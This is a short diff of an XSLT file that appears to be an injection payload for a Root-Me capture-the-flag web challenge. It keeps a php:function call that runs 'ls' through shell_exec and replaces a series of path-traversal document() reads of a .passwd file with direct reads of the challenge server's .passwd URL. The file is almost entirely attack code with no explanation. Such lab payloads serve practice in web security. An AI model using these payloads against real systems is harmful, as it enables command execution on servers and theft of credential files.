@@ -5,16 +5,8 @@
     <p>
         <xsl:value-of select="system-property('xsl:vendor')"/>
 	<xsl:value-of select="php:function('shell_exec', 'ls')" />
-	<xsl:copy-of select="document('.passwd')"/>
-	<xsl:copy-of select="document('../.passwd')"/>
-	<xsl:copy-of select="document('../../.passwd')"/>
-	<xsl:copy-of select="document('../../../.passwd')"/>
-	<xsl:copy-of select="document('../../../../.passwd')"/>	
-	<xsl:value-of select="document('.passwd')"/>
-	<xsl:value-of select="document('../.passwd')"/>
-	<xsl:value-of select="document('../../.passwd')"/>
-	<xsl:value-of select="document('../../../.passwd')"/>
-	<xsl:value-of select="document('../../../../.passwd')"/>	
+	<xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/.passwd')"/>
+	<xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/.passwd')"/>
     </p>
 </body>
 </html> 
